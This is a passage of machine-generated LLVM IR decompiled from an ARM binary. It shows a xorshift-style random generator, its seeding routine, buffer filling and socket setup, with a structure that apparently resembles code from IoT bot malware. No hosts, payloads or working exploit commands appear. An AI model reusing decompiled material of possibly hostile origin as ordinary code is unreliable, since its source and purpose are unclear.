  store i32 %v2_df60, i32* %r3.global-to-local, align 4
  %v2_df64 = sub i32 %v0_df48, %v2_df60
  %v1_df68 = add i32 %v2_df64, 1
  %v1_df6c = call i32 @function_12cc8(i32 %v1_df68)
  br label %dec_label_pc_db90

dec_label_pc_df74:                                ; preds = %dec_label_pc_dc9c
  %v0_df78 = load i32, i32* @sl, align 4
  %v1_df78 = inttoptr i32 %v0_df78 to i32*
  %v2_df78 = load i32, i32* %v1_df78, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_df88 = call i32 @function_11300(i32 %v2_df78, i32 %v2_df7c, i32 2, i32 16384)
  br label %dec_label_pc_dcc8

dec_label_pc_df90:                                ; preds = %dec_label_pc_de04, %dec_label_pc_dd98
  %v0_df90 = load i32, i32* @r5, align 4
  %v1_df90 = inttoptr i32 %v0_df90 to i32*
  %v2_df90 = load i32, i32* %v1_df90, align 4
  store i32 %v2_df90, i32* %r3.global-to-local, align 4
  %v7_df94 = icmp eq i32 %v2_df90, 4
  br i1 %v7_df94, label %dec_label_pc_db90, label %bb44

bb44:                                             ; preds = %dec_label_pc_df90
  %v8_df98 = icmp eq i32 %v2_df90, 11
  br i1 %v8_df98, label %dec_label_pc_db90, label %dec_label_pc_dfa0

dec_label_pc_dfa0:                                ; preds = %bb44, %dec_label_pc_de24, %dec_label_pc_ddd0
  %v0_dfa0 = load i32, i32* @sl, align 4
  %v1_dfa0 = inttoptr i32 %v0_dfa0 to i32*
  %v2_dfa0 = load i32, i32* %v1_dfa0, align 4
  store i32 57260, i32* @lr, align 4
  %v1_dfa8 = icmp ne i32 %v2_dfa0, -1
  call void @__pseudo_cond_branch(i1 %v1_dfa8, i32 ptrtoint (i32* @global_var_10be0.94 to i32))
  store i32 124208, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* inttoptr (i32 124208 to i32*), align 16
  %v1_dfbc = call i32 @function_12cc8(i32 1)
  br label %dec_label_pc_db90

dec_label_pc_dfc4:                                ; preds = %dec_label_pc_df00
  %v2_dfcc = call i32 @function_10120(i8* %v1_dfcc)
  %sext = mul i32 %v2_dfcc, 16777216
  %v1_dfd0 = sdiv i32 %sext, 16777216
  %v7_dfd0 = inttoptr i32 %v1_dfd0 to i8*
  store i8* %v7_dfd0, i8** %stack_var_-42, align 4
  %v0_dfd4 = call i32 @function_103dc()
  store i32 %v0_dfd4, i32* @global_var_20780.45, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_dfe8 = load i32, i32* @r5, align 4
  store i32 %v0_dfe8, i32* %r2.global-to-local, align 4
  %v0_dfec = load i32, i32* @r4, align 4
  %v1_dfec = inttoptr i32 %v0_dfec to i32*
  %v2_dfec = load i32, i32* %v1_dfec, align 4
  %v4_dff0 = call i32 @function_11300(i32 %v2_dfec, i32 ptrtoint (i32* @global_var_15f64.97 to i32), i32 %v0_dfe8, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_dffc = load i32, i32* @r4, align 4
  %v1_dffc = inttoptr i32 %v0_dffc to i32*
  %v2_dffc = load i32, i32* %v1_dffc, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e008 = call i32 @function_11300(i32 %v2_dffc, i32 %v2_df7c, i32 1, i32 16384)
  %v3_e00c = load i8*, i8** %stack_var_-42, align 4
  %v4_e00c = ptrtoint i8* %v3_e00c to i32
  store i32 %v4_e00c, i32* %r2.global-to-local, align 4
  %v3_e010 = icmp eq i8* %v3_e00c, null
  br i1 %v3_e010, label %dec_label_pc_db90, label %dec_label_pc_e018

dec_label_pc_e018:                                ; preds = %dec_label_pc_dfc4
  %v0_e01c = load i32, i32* @r4, align 4
  %v1_e01c = inttoptr i32 %v0_e01c to i32*
  %v2_e01c = load i32, i32* %v1_e01c, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e028 = call i32 @function_11300(i32 %v2_e01c, i32 %v2_d9cc, i32 %v4_e00c, i32 16384)
  br label %dec_label_pc_db90

dec_label_pc_e030:                                ; preds = %dec_label_pc_ddd8
  %v0_e034 = load i32, i32* @r8, align 4
  %v1_e034 = inttoptr i32 %v0_e034 to i32*
  %v2_e034 = load i32, i32* %v1_e034, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_e040 = add i32 %v4_dddc, 16384
  store i32 %v1_e040, i32* %r3.global-to-local, align 4
  %v4_e044 = call i32 @function_1128c(i32 %v2_e034, i32 %v2_df7c, i32 2, i32 %v1_e040)
  br label %dec_label_pc_db90

dec_label_pc_e04c:                                ; preds = %dec_label_pc_dde8
  %v0_e04c = load i32, i32* @r8, align 4
  %v1_e04c = inttoptr i32 %v0_e04c to i32*
  %v2_e04c = load i32, i32* %v1_e04c, align 4
  %v1_e050 = call i32 @function_10be0(i32 %v2_e04c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e058 = load i32, i32* @r8, align 4
  %v2_e058 = inttoptr i32 %v1_e058 to i32*
  store i32 -1, i32* %v2_e058, align 4
  br label %dec_label_pc_db90

; uselistorder directives
  uselistorder i32 %v3_de9c, { 3, 2, 1, 0 }
  uselistorder i8* %v3_de78, { 1, 0 }
  uselistorder i32 %v5_de54, { 1, 0, 2, 3 }
  uselistorder i32 %v4_de48, { 1, 0 }
  uselistorder i32 %v7_de18, { 1, 0 }
  uselistorder i32 %v5_ddf0, { 1, 0, 3, 2 }
  uselistorder i32 %v4_dddc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_ddc4, { 1, 0 }
  uselistorder i32 %v2_dd60, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v5_dca4, { 1, 0, 2 }
  uselistorder i32 %v2_dca0, { 2, 0, 1 }
  uselistorder i32 %v5_dc88, { 1, 2, 0 }
  uselistorder i32 %v2_dbcc, { 2, 1, 0 }
  uselistorder i32 %v1_dbc0, { 1, 2, 0 }
  uselistorder i32 %v1_dba4, { 1, 2, 0 }
  uselistorder i32 %v2_df7c, { 2, 0, 4, 3, 1 }
  uselistorder i32 %v2_dcb4, { 3, 2, 1, 0 }
  uselistorder i32 %v2_db8c, { 1, 0, 2 }
  uselistorder i32 %v2_da28, { 0, 10, 1, 11, 2, 9, 3, 4, 8, 7, 5, 12, 6 }
  uselistorder i32 %v2_da10, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_d938, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 9 }
  uselistorder i8* null, { 2, 0, 1 }
  uselistorder i32 16386, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @function_12cc8, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1e704.92 to i32), { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1e704.92 to i8*), { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_d83c, { 1, 0 }
  uselistorder i32 (i32)* @function_ced0, { 1, 0 }
  uselistorder i32 (i32)* @function_85e0, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_e158, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_d694, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_d7f4.68 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_2078c.76 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @function_11468, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_dcc8, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_dc10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dc00, { 1, 0 }
  uselistorder label %dec_label_pc_db90, { 7, 8, 9, 1, 10, 2, 0, 11, 12, 3, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_d9e0, { 2, 0, 1 }
}

define i32 @function_e07c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e07c:
  %cpsr_c.global-to-local = alloca i1, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v0_e07c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e07c, label %bb, label %dec_label_pc_e07c..thread1_crit_edge

dec_label_pc_e07c..thread1_crit_edge:             ; preds = %dec_label_pc_e07c
  %v0_e088.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %.thread1

bb:                                               ; preds = %dec_label_pc_e07c
  %v2_e084 = load i32, i32* @r4, align 4
  %v3_e084 = and i32 %v2_e084, 262144
  %v4_e084 = icmp ne i32 %v3_e084, 0
  store i1 %v4_e084, i1* %cpsr_c.global-to-local, align 1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e07c..thread1_crit_edge, %bb
  %v0_e088 = phi i1 [ %v0_e088.pre, %dec_label_pc_e07c..thread1_crit_edge ], [ %v4_e084, %bb ]
  call void @__pseudo_cond_branch(i1 %v0_e088, i32 -22312132)
  %v0_e090 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e090, label %bb3, label %bb4

bb3:                                              ; preds = %.thread1
  %v2_e090 = load i32, i32* @r4, align 4
  %v6_e090 = and i32 %v2_e090, 536870912
  %v7_e090 = icmp ne i32 %v6_e090, 0
  store i1 %v7_e090, i1* %cpsr_c.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %.thread1, %bb3
  ret i32 %arg1

; uselistorder directives
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_e094() local_unnamed_addr {
dec_label_pc_e094:
  %v2_e0a0 = load i32, i32* @global_var_1e708.99, align 4
  %v2_e0a4 = load i32, i32* @global_var_1e714.101, align 4
  %v4_e0b0 = mul i32 %v2_e0a0, 2048
  %v5_e0b0 = xor i32 %v4_e0b0, %v2_e0a0
  store i32 %v5_e0b0, i32* @r3, align 4
  %v4_e0b4 = udiv i32 %v2_e0a4, 524288
  %v5_e0b4 = xor i32 %v4_e0b4, %v2_e0a4
  %v2_e0b8 = load i32, i32* @global_var_1e70c.103, align 4
  %v2_e0bc = load i32, i32* @global_var_1e710.105, align 4
  %v2_e0c0 = xor i32 %v5_e0b4, %v5_e0b0
  %v4_e0c4 = udiv i32 %v5_e0b0, 256
  %v5_e0c4 = xor i32 %v2_e0c0, %v4_e0c4
  store i32 %v2_e0b8, i32* @global_var_1e708.99, align 4
  store i32 %v2_e0bc, i32* @global_var_1e70c.103, align 4
  store i32 %v2_e0a4, i32* @global_var_1e710.105, align 4
  store i32 %v5_e0c4, i32* @global_var_1e714.101, align 4
  ret i32 %v5_e0c4

; uselistorder directives
  uselistorder i32 %v2_e0a4, { 2, 1, 0 }
  uselistorder i32 %v2_e0a0, { 1, 0 }
}

define i32 @function_e0f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_e0f0:
  %v2_e0fc = call i32 @function_10860(i32* null)
  store i32 %v2_e0fc, i32* @r0, align 4
  store i32 %v2_e0fc, i32* @global_var_1e708.99, align 4
  %v0_e108 = call i32 @function_1084c()
  store i32 %v0_e108, i32* @r0, align 4
  %v0_e110 = call i32 @function_107a4()
  %v2_e118 = xor i32 %v0_e108, %v0_e110
  store i32 %v2_e118, i32* @global_var_1e70c.103, align 4
  %v1_e120 = call i32 @function_11024(i32 %v2_e118)
  %v2_e124 = load i32, i32* @global_var_1e70c.103, align 4
  %v2_e130 = xor i32 %v2_e124, %v1_e120
  store i32 %v2_e130, i32* @global_var_1e714.101, align 4
  store i32 %v1_e120, i32* @global_var_1e710.105, align 4
  ret i32 %v1_e120

; uselistorder directives
  uselistorder i32 %v1_e120, { 1, 2, 0 }
  uselistorder i32 ()* @function_107a4, { 2, 1, 0 }
}

define i32 @function_e158(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e158:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e158 = load i32, i32* @r4, align 4
  %v6_e158 = load i32, i32* @r5, align 4
  %v9_e158 = load i32, i32* @r6, align 4
  %v12_e158 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e16c = call i32 @function_fd40(i32 28)
  %v3_e178 = call i32 @function_fc7c(i32 28, i32* null)
  store i32 %v3_e178, i32* @r1, align 4
  %v2_e184 = bitcast i32* %stack_var_-72 to i8*
  %v3_e184 = call i32 @function_11120(i8* %v2_e184, i32 %v3_e178)
  %v2_e188 = icmp eq i32 %arg2, 0
  br i1 %v2_e188, label %dec_label_pc_e204, label %dec_label_pc_e190

dec_label_pc_e190:                                ; preds = %dec_label_pc_e158
  store i32 ptrtoint (i32* @global_var_1e708.99 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e70c.103 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e710.105 to i32), i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1e714.101 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e1e8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e1a4

dec_label_pc_e1a4:                                ; preds = %dec_label_pc_e1a4.dec_label_pc_e1a4_crit_edge, %dec_label_pc_e190
  %v1_e1c8 = phi i32 [ %v1_e1c8.pre, %dec_label_pc_e1a4.dec_label_pc_e1a4_crit_edge ], [ ptrtoint (i32* @global_var_1e708.99 to i32), %dec_label_pc_e190 ]
  %v2_e1a4 = load i32, i32* @global_var_1e714.101, align 4
  store i32 %v2_e1a4, i32* %r2.global-to-local, align 4
  %v2_e1a8 = load i32, i32* @global_var_1e708.99, align 4
  %v4_e1ac = udiv i32 %v2_e1a4, 524288
  %v5_e1ac = xor i32 %v4_e1ac, %v2_e1a4
  %v4_e1b0 = mul i32 %v2_e1a8, 2048
  %v5_e1b0 = xor i32 %v4_e1b0, %v2_e1a8
  %v2_e1b4 = xor i32 %v5_e1ac, %v5_e1b0
  %v2_e1b8 = load i32, i32* @global_var_1e70c.103, align 4
  %v2_e1bc = load i32, i32* @global_var_1e710.105, align 4
  store i32 %v2_e1bc, i32* %ip.global-to-local, align 4
  %v4_e1c0 = udiv i32 %v5_e1b0, 256
  %v5_e1c0 = xor i32 %v2_e1b4, %v4_e1c0
  store i32 %v5_e1c0, i32* @r4, align 4
  %v2_e1c8 = inttoptr i32 %v1_e1c8 to i32*
  store i32 %v2_e1b8, i32* %v2_e1c8, align 4
  %v0_e1cc = load i32, i32* %ip.global-to-local, align 4
  %v1_e1cc = load i32, i32* %r8.global-to-local, align 4
  %v2_e1cc = inttoptr i32 %v1_e1cc to i32*
  store i32 %v0_e1cc, i32* %v2_e1cc, align 4
  %v0_e1d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e1d0 = load i32, i32* @r7, align 4
  %v2_e1d0 = inttoptr i32 %v1_e1d0 to i32*
  store i32 %v0_e1d0, i32* %v2_e1d0, align 4
  %v0_e1d4 = load i32, i32* @r4, align 4
  %v1_e1d4 = load i32, i32* @r6, align 4
  %v2_e1d4 = inttoptr i32 %v1_e1d4 to i32*
  store i32 %v0_e1d4, i32* %v2_e1d4, align 4
  %v2_e1d8 = call i32 @function_10120(i8* %v2_e184)
  %v0_e1e0 = load i32, i32* @r4, align 4
  %v2_e1e4 = call i32 @function_10778(i32 %v0_e1e0, i32 %v2_e1d8)
  %v2_e1ec = add i32 %v2_e1d8, %v2_e1e8
  %v1_e1f0 = add i32 %v2_e1ec, -32
  %v2_e1f0 = inttoptr i32 %v1_e1f0 to i8*
  %v3_e1f0 = load i8, i8* %v2_e1f0, align 1
  %v2_e1f4 = load i32, i32* @r5, align 4
  %v3_e1f4 = load i32, i32* %fp.global-to-local, align 4
  %v4_e1f4 = add i32 %v3_e1f4, %v2_e1f4
  %v5_e1f4 = inttoptr i32 %v4_e1f4 to i8*
  store i8 %v3_e1f0, i8* %v5_e1f4, align 1
  %v0_e1f8 = load i32, i32* @r5, align 4
  %v1_e1f8 = add i32 %v0_e1f8, 1
  store i32 %v1_e1f8, i32* @r5, align 4
  %v1_e1fc = load i32, i32* %sb.global-to-local, align 4
  %v9_e1fc = icmp eq i32 %v1_e1f8, %v1_e1fc
  br i1 %v9_e1fc, label %dec_label_pc_e204, label %dec_label_pc_e1a4.dec_label_pc_e1a4_crit_edge

dec_label_pc_e1a4.dec_label_pc_e1a4_crit_edge:    ; preds = %dec_label_pc_e1a4
  %v1_e1c8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e1a4

dec_label_pc_e204:                                ; preds = %dec_label_pc_e1a4, %dec_label_pc_e158
  %v1_e208 = call i32 @function_fca0(i32 28)
  store i32 %v3_e158, i32* @r4, align 4
  store i32 %v6_e158, i32* @r5, align 4
  store i32 %v9_e158, i32* @r6, align 4
  store i32 %v12_e158, i32* @r7, align 4
  ret i32 %v1_e208

; uselistorder directives
  uselistorder i32 %v2_e1a8, { 1, 0 }
  uselistorder i32 %v2_e1a4, { 1, 0, 2 }
}

define i32 @function_e228(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e228:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e228 = load i32, i32* %r1.global-to-local, align 4
  %v3_e22c = load i32, i32* @r4, align 4
  store i32 %v3_e22c, i32* %stack_var_-28, align 4
  %v0_e230 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e230, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e228, 1
  br i1 %tmp16, label %dec_label_pc_e2d8, label %dec_label_pc_e238

dec_label_pc_e238:                                ; preds = %dec_label_pc_e228
  store i32 ptrtoint (i32* @global_var_1e714.101 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e710.105 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e70c.103 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e708.99 to i32), i32* %r6.global-to-local, align 4
  %v2_e248 = load i32, i32* @global_var_1e714.101, align 4
  store i32 %v2_e248, i32* %lr.global-to-local, align 4
  %v2_e24c = load i32, i32* @global_var_1e710.105, align 4
  store i32 %v2_e24c, i32* %r4.global-to-local, align 4
  %v2_e250 = load i32, i32* @global_var_1e70c.103, align 4
  store i32 %v2_e250, i32* %r0.global-to-local, align 4
  %v2_e254 = load i32, i32* @global_var_1e708.99, align 4
  br label %dec_label_pc_e278

dec_label_pc_e25c:                                ; preds = %dec_label_pc_e298
  %v1_e25c = trunc i32 %v5_e288 to i16
  %v3_e25c = inttoptr i32 %v9_e28c to i16*
  store i16 %v1_e25c, i16* %v3_e25c, align 2
  %v4_e25c = load i32, i32* %r5.global-to-local, align 4
  %v5_e25c = add i32 %v4_e25c, -2
  store i32 %v5_e25c, i32* %r5.global-to-local, align 4
  %v0_e260.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e260

dec_label_pc_e260:                                ; preds = %.thread, %dec_label_pc_e25c
  %v0_e260 = phi i32 [ %v9_e290, %.thread ], [ %v0_e260.pre, %dec_label_pc_e25c ]
  %v2_e25c5 = phi i32 [ %v12_e28c, %.thread ], [ %v5_e25c, %dec_label_pc_e25c ]
  %tmp17 = icmp slt i32 %v0_e260, 1
  br i1 %tmp17, label %dec_label_pc_e2e0, label %dec_label_pc_e26c

dec_label_pc_e26c:                                ; preds = %dec_label_pc_e260
  %v0_e264 = load i32, i32* %r0.global-to-local, align 4
  %v0_e26c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e26c, i32* %r0.global-to-local, align 4
  %v0_e270 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e270, i32* %r4.global-to-local, align 4
  %v0_e274 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e274, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e278

dec_label_pc_e278:                                ; preds = %dec_label_pc_e238, %dec_label_pc_e26c
  %v0_e2c4 = phi i32 [ %v2_e250, %dec_label_pc_e238 ], [ %v0_e26c, %dec_label_pc_e26c ]
  %v9_e28c = phi i32 [ %v0_e230, %dec_label_pc_e238 ], [ %v2_e25c5, %dec_label_pc_e26c ]
  %v0_e2a4 = phi i32 [ %v0_e228, %dec_label_pc_e238 ], [ %v0_e260, %dec_label_pc_e26c ]
  %v0_e2b8 = phi i32 [ %v2_e248, %dec_label_pc_e238 ], [ %v0_e274, %dec_label_pc_e26c ]
  %v0_e2b4 = phi i32 [ %v2_e254, %dec_label_pc_e238 ], [ %v0_e264, %dec_label_pc_e26c ]
  %v4_e278 = mul i32 %v0_e2b4, 2048
  %v5_e278 = xor i32 %v4_e278, %v0_e2b4
  %v4_e27c = udiv i32 %v0_e2b8, 524288
  %v5_e27c = xor i32 %v4_e27c, %v0_e2b8
  %v2_e280 = xor i32 %v5_e27c, %v5_e278
  %v4_e288 = udiv i32 %v5_e278, 256
  %v5_e288 = xor i32 %v2_e280, %v4_e288
  store i32 %v5_e288, i32* %r3.global-to-local, align 4
  %v7_e28c = icmp sgt i32 %v0_e2a4, 3
  br i1 %v7_e28c, label %.thread, label %dec_label_pc_e298

.thread:                                          ; preds = %dec_label_pc_e278
  %v10_e28c = inttoptr i32 %v9_e28c to i32*
  store i32 %v5_e288, i32* %v10_e28c, align 4
  %v11_e28c = load i32, i32* %r5.global-to-local, align 4
  %v12_e28c = add i32 %v11_e28c, 4
  store i32 %v12_e28c, i32* %r5.global-to-local, align 4
  %v8_e290 = load i32, i32* %r1.global-to-local, align 4
  %v9_e290 = add i32 %v8_e290, -4
  store i32 %v9_e290, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e260

dec_label_pc_e298:                                ; preds = %dec_label_pc_e278
  %v7_e2a4 = icmp eq i32 %v0_e2a4, 1
  store i32 %v5_e288, i32* %r3.global-to-local, align 4
  %v1_e2ac = add i32 %v0_e2a4, -2
  store i32 %v1_e2ac, i32* %r1.global-to-local, align 4
  br i1 %v7_e2a4, label %dec_label_pc_e2b4, label %dec_label_pc_e25c

dec_label_pc_e2b4:                                ; preds = %dec_label_pc_e298
  store i32 %v5_e288, i32* %r3.global-to-local, align 4
  %v1_e2c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e2c4 = inttoptr i32 %v1_e2c4 to i32*
  store i32 %v0_e2c4, i32* %v2_e2c4, align 4
  %v0_e2c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_e2c8 = load i32, i32* %r7.global-to-local, align 4
  %v2_e2c8 = inttoptr i32 %v1_e2c8 to i32*
  store i32 %v0_e2c8, i32* %v2_e2c8, align 4
  %v0_e2cc = load i32, i32* %lr.global-to-local, align 4
  %v1_e2cc = load i32, i32* %r8.global-to-local, align 4
  %v2_e2cc = inttoptr i32 %v1_e2cc to i32*
  store i32 %v0_e2cc, i32* %v2_e2cc, align 4
  %v0_e2d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2d0 = load i32, i32* %sl.global-to-local, align 4
  %v2_e2d0 = inttoptr i32 %v1_e2d0 to i32*
  store i32 %v0_e2d0, i32* %v2_e2d0, align 4
  %v0_e2d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2d4 = trunc i32 %v0_e2d4 to i8
  %v2_e2d4 = load i32, i32* %r5.global-to-local, align 4
  %v3_e2d4 = inttoptr i32 %v2_e2d4 to i8*
  store i8 %v1_e2d4, i8* %v3_e2d4, align 1
  br label %dec_label_pc_e2d8

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e228, %dec_label_pc_e2e0, %dec_label_pc_e2b4
  %v2_e2d8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e2d8, i32* @r4, align 4
  %v1_e2dc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e2dc

dec_label_pc_e2e0:                                ; preds = %dec_label_pc_e260
  %v0_e2e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2e0 = load i32, i32* %sl.global-to-local, align 4
  %v2_e2e0 = inttoptr i32 %v1_e2e0 to i32*
  store i32 %v0_e2e0, i32* %v2_e2e0, align 4
  %v0_e2e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_e2e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_e2e4 = inttoptr i32 %v1_e2e4 to i32*
  store i32 %v0_e2e4, i32* %v2_e2e4, align 4
  %v0_e2e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_e2e8 = load i32, i32* %r7.global-to-local, align 4
  %v2_e2e8 = inttoptr i32 %v1_e2e8 to i32*
  store i32 %v0_e2e8, i32* %v2_e2e8, align 4
  %v0_e2ec = load i32, i32* %r0.global-to-local, align 4
  %v1_e2ec = load i32, i32* %r6.global-to-local, align 4
  %v2_e2ec = inttoptr i32 %v1_e2ec to i32*
  store i32 %v0_e2ec, i32* %v2_e2ec, align 4
  br label %dec_label_pc_e2d8

; uselistorder directives
  uselistorder i32 %v9_e290, { 1, 0 }
  uselistorder i32 %v12_e28c, { 1, 0 }
  uselistorder i32 %v5_e288, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e2b4, { 1, 0 }
  uselistorder i32 %v0_e2b8, { 1, 0 }
  uselistorder i32 %v0_e2a4, { 1, 0, 2 }
  uselistorder i32 %v0_e260, { 1, 0 }
  uselistorder i32 %v0_e228, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_1e708.99, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1e708.99 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_1e70c.103, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_1e710.105, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1e714.101, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e2d8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e278, { 1, 0 }
}

define i32 @function_e304() local_unnamed_addr {
dec_label_pc_e304:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e304 = load i32, i32* @r4, align 4
  store i32 %v3_e304, i32* %stack_var_-16, align 4
  %v12_e304 = load i32, i32* @lr, align 4
  %v0_e308 = load i32, i32* @r0, align 4
  store i32 %v0_e308, i32* %r5.global-to-local, align 4
  %v1_e30c = add i32 %v0_e308, 4
  %v2_e30c = inttoptr i32 %v1_e30c to i32*
  %v3_e30c = load i32, i32* %v2_e30c, align 4
  store i32 %v3_e30c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 58160, i32* @lr, align 4
  %v1_e32c = icmp ne i32 %v3_e30c, -1
  call void @__pseudo_cond_branch(i1 %v1_e32c, i32 ptrtoint (i32* @global_var_10be0.94 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e33c = call i32 @function_113bc(i32 2, i32 1, i32 0)
  store i32 %v3_e33c, i32* %r0.global-to-local, align 4
  %v7_e340 = icmp eq i32 %v3_e33c, -1
  %v1_e344 = load i32, i32* %r5.global-to-local, align 4
  %v2_e344 = add i32 %v1_e344, 4
  %v3_e344 = inttoptr i32 %v2_e344 to i32*
  store i32 %v3_e33c, i32* %v3_e344, align 4
  br i1 %v7_e340, label %dec_label_pc_e304.dec_label_pc_e3bc_crit_edge, label %dec_label_pc_e34c

dec_label_pc_e304.dec_label_pc_e3bc_crit_edge:    ; preds = %dec_label_pc_e304
  %v1_e3c4.pre = load i32, i32* %r0.global-to-local, align 4
